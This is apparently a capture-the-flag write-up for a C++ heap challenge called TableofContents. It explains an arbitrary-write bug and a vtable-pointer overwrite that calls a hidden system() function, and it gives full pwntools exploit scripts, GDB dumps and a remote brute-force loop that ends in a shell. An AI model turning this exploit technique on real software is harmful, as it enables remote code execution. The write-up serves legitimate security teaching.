# TableofContents

The description for this challenge is as follows:

*Come and browse my brand new library! Just as long as you don't try and read my personal books...*

The challenge was rated at 2 out of 4 stars, and it was worth 450 points at the end with a total of 10 solves. It wasn't too incredibly difficult; it just required a slightly unique technique and some reverse engineering. As a result, I would put it on the high end of medium difficulty for pwn. For reference, I'm not sure if this is the intended solve, since there were some functions in the binary that I didn't use.

In terms of downloadables, we got the challenge source code, the challenge binary, and a makefile. To the best of my knowledge, the infrastructure on which the challenge was running was not provided.

**TL;DR Solution:** Notice that the borrow and return books ability theoretically lets you overwrite any writable section of memory with some of the metadata of one of your book structures. Since Book is a C++ class, the addresses of its virtual methods can be found in a vtable, a pointer to which is located on the heap. We can find the pointer to the vtable, overwrite it to point to the book's title, and essentially write a new vtable in  the title in which everything points to the win function. Since we need to call the win function with '/bin/sh' in rdi, we then trigger the leave_feedback function, pass it /bin/sh as feedback which is then fed into Book's feedback method as the first argument, and then we have a shell.

## Gathering Information

As usual, I started out by simply running the binary. It presented us with a menu with 5 options; at this moment, the most interesting ones show up in the "Borrow books" section of the Fetch option, which seems to give us a heap leak with no effort, and return book, whose requestfor a reference number seems, in context, like it could be writing to an arbitrary address. Obviously, that's pretty promising!
```
knittingirl@piglet:~/CTF/romCTF/pwn_table_of_contents$ ./tableofcontents
WELCOME!
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
> 1
Enter title > aaaaaaaaaaaaaaaaaaaaaaaaaa
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
> 2
aaaaaaaaaaaaaaaaaaaaaaaaaa
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
> 3
What index to get? 0
1) Borrow book
2) Add a page
3) Tear out page
> 1
Your reference number is: 0x8d9340
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
> 4
Enter reference number: 12
Segmentation fault
```
Next, I ran checksec on the binary; in particular, I was curious if some sort of GOT overwrite would be possible because of the potential write-anywhere primitive. This was not the case because Full RELRO is enabled, but the binary has no PIE, so that should make things a bit easier.
```
knittingirl@piglet:~/CTF/romCTF/pwn_table_of_contents$ checksec tableofcontents
[*] '/home/knittingirl/CTF/romCTF/pwn_table_of_contents/tableofcontents'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Now we can drill into the source code that has been so generously provided! It's fairly long, so I'll try to focus on the highlights. One really interesting thing in the code is the class declarations; the LibraryItem class has a private win method that will use system to execute a provided argument. The Book class inherits LibraryItem's public methods, which do not include the win function. We have a vector (FYI, this is like an array on the heap) of book pointers in the items global variable, as well as a global Book pointer in borrowed.
```
class LibraryItem {
    public:
        virtual void add_page() = 0;
        virtual void tear_page() = 0;
        virtual void read() = 0;
        virtual ~LibraryItem() {};
        std::string title;
        std::vector<char *> pages;
    private:
        __attribute__((used))
        //Here we see a win condition. 
        void win(const char* arg) {
            system(arg);
        }
};

class Book: public LibraryItem {
    public:
        Book(std::string title) {
            this->title = std::move(title);
        }
        virtual void add_page() {
            printf("Enter size of page: ");
            unsigned int size;
            std::cin >> size;
            flush();
            char *buf = (char *)malloc(size);
            printf("Enter data: ");
            std::cin.read(buf, size);
            this->pages.push_back(buf);
        }
        virtual void tear_page() {
            printf("Enter index of page: ");
            unsigned int index;
            std::cin >> index;
            puts(this->pages[index]);
            free(this->pages[index]);
        }
        virtual void read() {
            for (char * &page: this->pages) {
                puts(page);
            }
        }

        virtual void feedback(const char* content) {
            puts("Your feedback is highly valued!");
            memset((void *)content, 0, strlen(content));
        }
};

std::vector<Book *> items;
bool has_borrowed = false;
Book* borrowed = new Book("");
```
In terms of functionality, add() and list() correspond to the first two options. They are fairly straightforward; add() uses getline() to obtain a title from the user, then adds a Book with that title to the items vector. list() runs a for loop over the items vector based on its current size and prints the title of each Book there.
```
void add() {
    std::string contents;
    printf("Enter title > ");
    getline(std::cin, contents);
    items.push_back(new Book(contents));
}

void list() {
    for (int i = 0; i < items.size(); i++) {
        std::cout << items[i]->title << std::endl;
    }
};
```
The fetch() function is much more interesting; I'm focusing on the "Borrow book" option, since I didn't use the other two. This option lets us input an index for the items vector; if we choose to borrow, it checks if we've borrowed other books without returning them based on the has_borrowed global, copies the book at the index into the borrowed global, then frees the area of memory at the selected index. Finally, it prints a pointer to the area of memory where that item index is located, which should be in the heap. 
```
void fetch() {
    unsigned int index;
    printf("What index to get? ");
    std::cin >> index;
    if (index >= items.size()) {
        puts("That item does not exist");
        return;
    }
    printf("1) Borrow book\n2) Add a page\n3) Tear out page\n> ");
    char choice;
    scanf(" %c", &choice);
    flush();
    std::string contents;
    switch (choice) {
    case '1':
        if (has_borrowed ) {
            puts("You can only have one book borrowed");
            break;
        }
        memcpy((void *)borrowed, (void *)items[index], sizeof(Book));
        free((void *)items[index]);
        printf("Your reference number is: %p\n", items[index]);
        has_borrowed = true;
        break;
    case '2':
        items[index]->add_page();
        break;
    case '3':
        items[index]->tear_page();
        break;
    default:
        puts("Unknown option");
    }

};
```
The return_book() function basically lets us reverse that process, but to an area of memory of our choice. It lets us input a "reference number" as pointer (i.e. type in a hex address), and as long as it works out to less than 0x0000700000000000 (so no overwrites in the libc or stack regions), it will memcpy the contents of the borrowed variable to that address, up to the number of bytes of the Book class. Clearly, this also seems really useful.
```
void return_book() {
    Book *book;
    printf("Enter reference number: ");
    scanf("%p", &book);
    flush();
    if ((unsigned long)book >= 0x0000700000000000UL) {
        puts("Unauthorized access detected");
        exit(-1);
    }
    memcpy((void *)book, (void *)borrowed, sizeof(Book));
    has_borrowed = false;
    puts("Thank you for returning the book");
}
```
Finally, the leave_feedback option is not exceptionally interesting at the moment; the user types in index of the book receiving the feedback, the feedback is entered, and a method of the Book class is used to immediately zero out the contents of the string that the feedback was just read into! This sounds anticlimactic, but it does come in useful later.
```
void leave_feedback() {
    unsigned int index;
    printf("Enter index of book for feedback: ");
    std::cin >> index;
    flush();
    std::string* feedback = new std::string();
    printf("Enter feedback: ");
    getline(std::cin, *feedback);
    items[index]->feedback(feedback->c_str());
}
```
## Planning the Exploit, and How Vtables Help

So, at this point, it seemed like the basic idea would involve some sort of heap overwrite, with the ultimate goal of calling the win function. I also knew that since libc or other version information was not included, this probably wasn't a libc-dependent type of heap exploit. Eventually, I hit on the vtable exploitation.

Basically, in C++, classes with virtual methods have an extra member variable when implemented, which is a pointer to a vtable. This vtable is an array of pointers to the class's virtual methods. Here is what it looks like in Ghidra:
```
                             **************************************************************
                             * vtable for Book                                            *
                             **************************************************************
                             _ZTV4Book                                       XREF[2]:     Entry Point(*), Book:00401f23(*)  
                             Book::vtable
        00404280 00              ??         00h
        00404281 00              ??         00h
        00404282 00              ??         00h
        00404283 00              ??         00h
        00404284 00              ??         00h
        00404285 00              ??         00h
        00404286 00              ??         00h
        00404287 00              ??         00h
        00404288 f0 42 40        addr       Book::typeinfo                                   = 00605c28
                 00 00 00 
                 00 00

                             PTR_add_page_00404290                           XREF[1]:     Book:00401f35(*)  
        00404290 50 20 40        addr       Book::add_page
                 00 00 00 
                 00 00
        00404298 f0 20 40        addr       Book::tear_page
                 00 00 00 
                 00 00
        004042a0 90 21 40        addr       Book::read
                 00 00 00 
                 00 00
        004042a8 10 22 40        addr       Book::~Book
                 00 00 00 
                 00 00
        004042b0 30 22 40        addr       Book::~Book
                 00 00 00 
                 00 00
        004042b8 60 22 40        addr       Book::feedback
                 00 00 00 
                 00 00

```
If we could overwrite entries here, we could just overwrite them to the address of the win function and call the win function by triggering the appropriate method; in principle, this is very similar to a GOT table overwrite. However, also much like a GOT table overwrite, the full RELRO means that this section of memory is non-writable, so that won't work. 

However, we can instead overwrite the pointer to the vtable, which is located in the heap. If we can do that, we can point it to somewhere that we control and essentially write a full, bogus vtable that will be checked against instead of the one in the code section. On my local host, I found the location of the vtable by using search-pattern in GDB GEF. I first wrote a basic pwntools script to interact with the program, including helper functions for each of the main functionalities, then I searched for the address, found exactly one appropriate location on the heap, found its offset from the leaked heap address, and repeated a few times to make sure it stayed consistent. The script is:
```
from pwn import *

#target = remote('178.62.51.178', 32245)

target = process('./tableofcontents')

pid = gdb.attach(target, "\nb *add\nb *fetch\nb *return_book\nset disassembly-flavor intel\ncontinue")


def donate_book(title):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'1')
	print(target.recvuntil(b'title'))
	target.sendline(title)

def list_books():
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'2')
	
def borrow_book(index):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'3')
	print(target.recvuntil(b'get?'))
	target.sendline(str(index))
	print(target.recvuntil(b'3) Tear out page'))
	target.sendline(b'1')
	print(target.recvuntil(b'is: '))
	pointer = target.recvline().strip()
	print(pointer)
	return(int(pointer, 16))
	
def return_book(ref_num):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'4')
	print(target.recvuntil(b'reference number'))
	target.sendline(hex(ref_num))

def feedback(index, my_feedback):
	print(target.recvuntil(b'5) Leave feedback'))
	target.sendline(b'5')
	print(target.recvuntil(b'feedback:'))
	target.sendline(str(index))
	print(target.recvuntil(b'Enter feedback:'))
	target.sendline(my_feedback)
	

donate_book(b'a' * 50)

list_books()

pointer = borrow_book(0)

print(hex(pointer))

target.interactive()
```
The results in the terminal:
```
knittingirl@piglet:~/CTF/romCTF/pwn_table_of_contents$ python3 tableofcontents_writeup.py 
[+] Starting local process './tableofcontents': pid 2521936
[*] running in new terminal: /usr/bin/gdb -q  "./tableofcontents" 2521936 -x /tmp/pwnz21x8x8m.gdb
[+] Waiting for debugger: Done
b'WELCOME!\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter title'
b' > 1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> What index to get?'
b' 1) Borrow book\n2) Add a page\n3) Tear out page'
b'\n> Your reference number is: '
b'0x1efa3a0'
0x1efa3a0
[*] Switching to interactive mode
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
> $ 1
```
And the location of the vtable pointer in GDB-GEF:
```
────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern 0x00404290
[+] Searching '\x90\x42\x40\x00' in memory
[+] In '[heap]'(0x1ee7000-0x1f08000), permission=rw-
  0x1ef8eb0 - 0x1ef8ec0  →   "\x90\x42\x40\x00[...]" 
gef➤  x/5gx 0x1ef8eb0
0x1ef8eb0:	0x0000000000404290	0x0000000001efa3f0
0x1ef8ec0:	0x0000000000000032	0x0000000000000032
0x1ef8ed0:	0x0000000000000000
gef➤  

```
The offset on my local system was 0x14f0 bytes before the leaked address. Finally, let's see exactly what happens when we borrow and return a book. I added the following lines to my pwntools script:
```
vtable_loc = pointer - 0x14f0
print('Here is where the vtable pointer is', hex(vtable_loc))

test_write_section = vtable_loc - 0x100
print('Here is where I\'m planning to write', hex(test_write_section))

return_book(test_write_section)
```
Here is the section of terminal output with addresses:
```
Here is my heap leak 0x179c3a0
Here is where the vtable pointer is 0x179aeb0
Here is where I'm planning to write 0x179adb0
```
Prior to returning the book, the relevant sections of memory look like this:
```
gef➤  x/20gx 0x179c3a0
0x179c3a0:	0x000000000179c350	0x0000000001789010
0x179c3b0:	0x0000000000000032	0x0000000000000032
0x179c3c0:	0x0000000000000000	0x0000000000000000
0x179c3d0:	0x0000000000000000	0x0000000000000000
0x179c3e0:	0x0000000000000000	0x0000000000000041
0x179c3f0:	0x6161616161616161	0x6161616161616161
0x179c400:	0x6161616161616161	0x6161616161616161
0x179c410:	0x6161616161616161	0x6161616161616161
0x179c420:	0x0000000000006161	0x0000000000000021
0x179c430:	0x000000000179c3a0	0x0000000000000000
gef➤  x/20gx 0x179aeb0
0x179aeb0:	0x0000000000404290	0x000000000179c3f0
0x179aec0:	0x0000000000000032	0x0000000000000032
0x179aed0:	0x0000000000000000	0x0000000000000000
0x179aee0:	0x0000000000000000	0x0000000000000000
0x179aef0:	0x0000000000000000	0x0000000000000411
0x179af00:	0x0000000000000000	0x0000000001789010
0x179af10:	0x0000000000000000	0x0000000000000000
0x179af20:	0x0000000000000000	0x0000000000000000
0x179af30:	0x0000000000000000	0x0000000000000000
0x179af40:	0x0000000000000000	0x0000000000000000
gef➤  x/20gx 0x179adb0
0x179adb0:	0x0000000000000000	0x0000000000000000
0x179adc0:	0x0000000000000000	0x0000000000000000
0x179add0:	0x0000000000000000	0x0000000000000000
0x179ade0:	0x0000000000000000	0x0000000000000000
0x179adf0:	0x0000000000000000	0x0000000000000000
0x179ae00:	0x0000000000000000	0x0000000000000000
0x179ae10:	0x0000000000000000	0x0000000000000000
0x179ae20:	0x0000000000000000	0x0000000000000000
0x179ae30:	0x0000000000000000	0x0000000000000000
0x179ae40:	0x0000000000000000	0x0000000000000000

```
Afterwards, they look like this:
```
gef➤  x/20gx 0x179c3a0
0x179c3a0:	0x000000000179c350	0x0000000001789010
0x179c3b0:	0x0000000000000032	0x0000000000000032
0x179c3c0:	0x0000000000000000	0x0000000000000000
0x179c3d0:	0x0000000000000000	0x0000000000000000
0x179c3e0:	0x0000000000000000	0x0000000000000041
0x179c3f0:	0x6161616161616161	0x6161616161616161
0x179c400:	0x6161616161616161	0x6161616161616161
0x179c410:	0x6161616161616161	0x6161616161616161
0x179c420:	0x0000000000006161	0x0000000000000021
0x179c430:	0x000000000179c3a0	0x0000000000000000
gef➤  x/20gx 0x179aeb0
0x179aeb0:	0x0000000000404290	0x000000000179c3f0
0x179aec0:	0x0000000000000032	0x0000000000000032
0x179aed0:	0x0000000000000000	0x0000000000000000
0x179aee0:	0x0000000000000000	0x0000000000000000
0x179aef0:	0x0000000000000000	0x0000000000000411
0x179af00:	0x0000000000000000	0x0000000001789010
0x179af10:	0x0000000000000000	0x0000000000000000
0x179af20:	0x0000000000000000	0x0000000000000000
0x179af30:	0x0000000000000000	0x0000000000000000
0x179af40:	0x0000000000000000	0x0000000000000000
gef➤  x/20gx 0x179adb0
0x179adb0:	0x0000000000404290	0x000000000179c3f0
0x179adc0:	0x0000000000000032	0x0000000000000032
0x179add0:	0x0000000000000000	0x0000000000000000
0x179ade0:	0x0000000000000000	0x0000000000000000
0x179adf0:	0x0000000000000000	0x0000000000000000
0x179ae00:	0x0000000000000000	0x0000000000000000
0x179ae10:	0x0000000000000000	0x0000000000000000
0x179ae20:	0x0000000000000000	0x0000000000000000
0x179ae30:	0x0000000000000000	0x0000000000000000
0x179ae40:	0x0000000000000000	0x0000000000000000
```
So, as far as I can tell, between 0x20 and 0x40 bytes from the offset of the vtable location get copied into the selected section of memory when we return books. The second address, 0x000000000179c3f0, points to the start of the book's title, which I can control. As a result, the plan at this point is to set the vtable pointer to point to the book's title, set up a false vtable in the title, then trigger Book methods in order to call win.

## Writing the Exploit

So, we first want to set up a fake vtable in the book title, then overwrite the vtable pointer to point there. As a quick aside, you will want to keep the length of your title relatively consistent, since this will help ensure that it gets allocated to the heap in a consistent location. You also need to return the book to where it came from as well before attempting to use your bogus vtable; I'll admit I'm not 100% sure why this is, but I'll edit the writeup later if I figure it out! The main payload looks like this:
```
donate_book(p64(0x00401e30) * 6 + b'a' * (50 - (8 * 6)))

pointer = borrow_book(0)

print('Here is my heap leak', hex(pointer))

vtable_loc = pointer - 0x14f0
print('Here is where the vtable pointer is', hex(vtable_loc))

vtable_loc_off = vtable_loc - 0x8


return_book(vtable_loc_off)
return_book(pointer)

#This is the add page option, should trigger a vtable method:
print(target.recvuntil(b'5) Leave feedback'))
target.sendline(b'3')
print(target.recvuntil(b'get?'))
target.sendline(b'0')
print(target.recvuntil(b'3) Tear out page'))
target.sendline(b'2')

target.interactive()
```
And here is the result in the terminal:
```
knittingirl@piglet:~/CTF/romCTF/pwn_table_of_contents$ python3 tableofcontents_writeup.py 
[+] Starting local process './tableofcontents': pid 2590105
[*] running in new terminal: /usr/bin/gdb -q  "./tableofcontents" 2590105 -x /tmp/pwnrmdal7er.gdb
[+] Waiting for debugger: Done
b'WELCOME!\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter title'
b' > 1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> What index to get?'
b' 1) Borrow book\n2) Add a page\n3) Tear out page'
b'\n> Your reference number is: '
b'0x25a03a0'
Here is my heap leak 0x25a03a0
Here is where the vtable pointer is 0x259eeb0
b'1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> What index to get?'
b' 1) Borrow book\n2) Add a page\n3) Tear out page'
[*] Switching to interactive mode

> sh: 1: UH\x89\xe5H\x83\xec: not found
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
```
We're close, but not quite there. The win function requires that we pass it a single parameter; presumably '/bin/sh' is preferrable. If we go back to the source code and look at the definitions of our virtual methods, we can see that feedback() is the only one that takes an argument. We can trigger it by using the leave_feedback() option, which will call the feedback() method with the feedback that we input as the first argument. 
```
        virtual void add_page() {
            printf("Enter size of page: ");
            unsigned int size;
            std::cin >> size;
            flush();
            char *buf = (char *)malloc(size);
            printf("Enter data: ");
            std::cin.read(buf, size);
            this->pages.push_back(buf);
        }
        virtual void tear_page() {
            printf("Enter index of page: ");
            unsigned int index;
            std::cin >> index;
            puts(this->pages[index]);
            free(this->pages[index]);
        }
        virtual void read() {
            for (char * &page: this->pages) {
                puts(page);
            }
        }

        virtual void feedback(const char* content) {
            puts("Your feedback is highly valued!");
            memset((void *)content, 0, strlen(content));
        }
...
void leave_feedback() {
    unsigned int index;
    printf("Enter index of book for feedback: ");
    std::cin >> index;
    flush();
    std::string* feedback = new std::string();
    printf("Enter feedback: ");
    getline(std::cin, *feedback);
    items[index]->feedback(feedback->c_str());
}

```
So, instead of adding a page, I now leave the feedback '/bin/sh' on our first book, and I have a shell on my local machine!
```
knittingirl@piglet:~/CTF/romCTF/pwn_table_of_contents$ python3 tableofcontents_writeup.py NOPTRACE
[+] Starting local process './tableofcontents': pid 2590193
[!] Skipping debug attach since context.noptrace==True
b'WELCOME!\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter title'
b' > 1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> What index to get?'
b' 1) Borrow book\n2) Add a page\n3) Tear out page'
b'\n> Your reference number is: '
b'0x1d313a0'
Here is my heap leak 0x1d313a0
Here is where the vtable pointer is 0x1d2feb0
b'1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter index of book for feedback:'
b' Enter feedback:'
[*] Switching to interactive mode
$ cat flag.txt
hello
$  
```
## The Remote Solve

When I tried to run this on the remote server, it failed miserably. The results in the terminal of sending feedback looked like this:
```
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave feedback'
b'\n> Enter index of book for feedback:'
b' Enter feedback:'
[*] Switching to interactive mode
 Your feedback is highly valued!
1) Donate book
2) List books
3) Fetch an item
4) Return book
5) Leave feedback
```
I decided that most likely, the problem was that the offset of the vtable pointer in the heap was different on the remote host than on my local machine, based on the fact that feedback() method seems to be running normally. However, with no information on the infrastructure that was running remotely, I could not effectively test that hypothesis. After attempting to check offsets with some common Ubuntu libc versions and continuing to get the same offset of 0x14f0, I basically set the whole thing up in a for loop to test a range of heap offsets in the vicinity of my heap leak - 0x14f0, which I left running while I left the house for a couple hours. When I came back, I had a hit when i = -130, so the actual offset would have been my heap leak - 0x10e0.
```
for i in range(-500, 500):
	print("I IS THE NUMBER", i)
	from pwn import *

	target = remote('142.93.44.199', 31159)

	#target = process('./tableofcontents')

	#pid = gdb.attach(target, "\nb *add\nb *fetch\nb *fetch+488\nb *fetch+517\nb *return_book+144\n set disassembly-flavor intel\ncontinue")

	def donate_book(title):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'1')
		print(target.recvuntil(b'title'))
		target.sendline(title)

	def list_books():
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'2')
		
	def borrow_book(index):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'3')
		print(target.recvuntil(b'get?'))
		target.sendline(str(index))
		print(target.recvuntil(b'3) Tear out page'))
		target.sendline(b'1')
		print(target.recvuntil(b'is: '))
		pointer = target.recvline().strip()
		print(pointer)
		return(int(pointer, 16))
		
	def return_book(ref_num):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'4')
		print(target.recvuntil(b'reference number'))
		target.sendline(hex(ref_num))

	def feedback(index, my_feedback):
		print(target.recvuntil(b'5) Leave feedback'))
		target.sendline(b'5')
		print(target.recvuntil(b'feedback:'))
		target.sendline(str(index))
		print(target.recvuntil(b'Enter feedback:'))
		target.sendline(my_feedback)
		

	#vtable overwrite. Note that this /bin/sh isn't actually necessary; it got added during debugging and wasn't hurting anything.
	donate_book(b'/bin/sh\x00' + p64(0x00401e30) * 5 + b'a' * (50 - (8 * 5)))

	list_books()

	pointer = borrow_book(0)

	print(hex(pointer))

	vtable_loc = pointer - (0x14f0 + i * 8)
	print(hex(vtable_loc))

	vtable_loc_off = vtable_loc - 0x8
	list_books()

	return_book(vtable_loc_off)
		
	return_book(pointer)

	feedback(0, '/bin/sh\x00')
	result = target.recvuntil(b'valued', timeout=1)
	print(result)
	if b'valued' in result:
		target.close()
		continue

	target.interactive()
	target.close()
```
My remote instance had died by the time I got back, so I simply reset the lower bound of my for loop to -130 and ran it to get my shell. Here is what it looked like.

```
knittingirl@piglet:~/CTF/romCTF/pwn_table_of_contents$ python3 tableofcontents_=
I IS THE NUMBER -130
[+] Opening connection to 142.93.44.199 on port 31159: Done
b'WELCOME!\n1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5)'
b'\n> Enter title'
b' > 1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave '
b'\n> /bin/sh\x000\x1e@\x00\x00\x00\x00\x000\x1e@\x00\x00\x00\x00\x000\x1e@\x00'
b'\n> What index to get?'
b' 1) Borrow book\n2) Add a page\n3) Tear out page'
b'\n> Your reference number is: '
b'0xbbaf90'
0xbbaf90
0xbb9eb0
b'1) Donate book\n2) List books\n3) Fetch an item\n4) Return book\n5) Leave fee'
b'\n> \x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\'
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch a'
b'\n> Enter reference number'
b': Thank you for returning the book\n1) Donate book\n2) List books\n3) Fetch a'
b'\n> Enter index of book for feedback:'
b' Enter feedback:'
b''
[*] Switching to interactive mode
 $ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ ls home
ctf
$ ls home/ctf
flag.txt
toc
$ cat home/ctf/flag.txt
HTB{L00ks_l1k3_th3_fl4g_15_0n_p4g3_74!}

```
Thanks for getting to the end of this one!
